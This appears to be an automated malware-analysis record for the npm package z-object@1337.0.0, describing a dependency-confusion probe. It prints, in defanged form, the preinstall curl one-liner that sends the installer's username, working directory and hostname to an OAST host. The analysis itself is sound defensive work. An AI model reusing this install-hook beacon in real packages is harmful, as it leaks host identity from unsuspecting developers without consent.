# npm z-object@1337.0.0

**Source:** datadog · **Source label:** malicious · **Released:** 2025-08-28 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package has no code files; everything runs from the `preinstall` script in `package.json`. That script is a single shell line that runs `curl` against an OAST interaction host, putting the output of `whoami`, `pwd` and `hostname` into the query string. There are no gates: no conditions in the hook, no manifest `os`/`cpu`/`libc` restrictions, so the beacon fires on every registry install wherever `sh` and `curl` exist. Version 1337.0.0 and the description fit a dependency-confusion probe.

## Execution

- **preinstall** `curl "hxxp://z-object[.]unhsfnnralonzbjxqyvdsskrwlbg27zue[.]oast[.]fun/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"`: no package files; inline_shell.

## Gates

None.

## Requirements

- network: z-object[.]unhsfnnralonzbjxqyvdsskrwlbg27zue[.]oast[.]fun:80 (curl GET carrying the collected values must reach the OAST host)
- installed_tool: curl (the hook calls curl directly)
- installed_tool: whoami (command substitution in the hook; also needs a POSIX sh for $(...))
- installed_tool: hostname (command substitution in the hook)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- Launch style corrected to `inline_shell`; nothing downloaded is run.
- `preupdate` is not an npm lifecycle hook. The `test` script holds token-shaped strings and never runs at install.
- The description says the package only confirms installation and is not malicious, but the hook sends identity data (username, path, hostname) off the host. Recorded as misleading text for review.
- Author and handle in the manifest are not recorded.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "z-object",
    "version": "1337.0.0",
    "archive_sha256": "3302d0589d5a1cbc8a582defb8b7f9f8188a681d310f96b7bd6cfabf2cd0d3b0",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-08-28",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-08-28-z-object-v1337.0.0.zip",
    "package_root": "layer0/tmp/tmphvq1gmli/z-object/package",
    "cluster_key": "3d65e287c115a1976e19ce7978083c38f872d4f7690914a0a860f74001d9b24f",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "curl \"hxxp://z-object[.]unhsfnnralonzbjxqyvdsskrwlbg27zue[.]oast[.]fun/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\"",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "Launch style corrected from download_then_exec to inline_shell: curl only sends a GET with whoami, pwd and hostname output in the query string; the response is printed, never run.",
      "package.json read in full; it is the only package file. No JS files exist, main index.js is missing. The preupdate script is not an npm lifecycle hook and does not run at install.",
      "The test script holds token-shaped strings (ghp_…, AKIA…, sk_l…); it never runs at install and looks like bait for secret scanners.",
      "The description claims the package's only function is to confirm installation and is not malicious, while the hook sends the username, working directory and hostname to an external OAST host. Recorded as misleading text."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "z-object[.]unhsfnnralonzbjxqyvdsskrwlbg27zue[.]oast[.]fun:80",
      "reason": "curl GET carrying the collected values must reach the OAST host"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "the hook calls curl directly"
    },
    {
      "axis": "installed_tool",
      "value": "whoami",
      "reason": "command substitution in the hook; also needs a POSIX sh for $(...)"
    },
    {
      "axis": "installed_tool",
      "value": "hostname",
      "reason": "command substitution in the hook"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [
      "misleading text"
    ],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxp://z-object[.]unhsfnnralonzbjxqyvdsskrwlbg27zue[.]oast[.]fun/",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "OAST curl beacon dependency-confusion probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook runs unconditionally and sends the installing user's name, working directory and hostname to an out-of-band interaction host. The 1337.0.0 version and the self-described research note fit a dependency-confusion probe; it collects and leaks host identity without consent.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": true,
  "review_reasons": [
    "misleading text: package description claims the only function is confirming installation and that it is not malicious, while the hook exfiltrates username, path and hostname"
  ],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
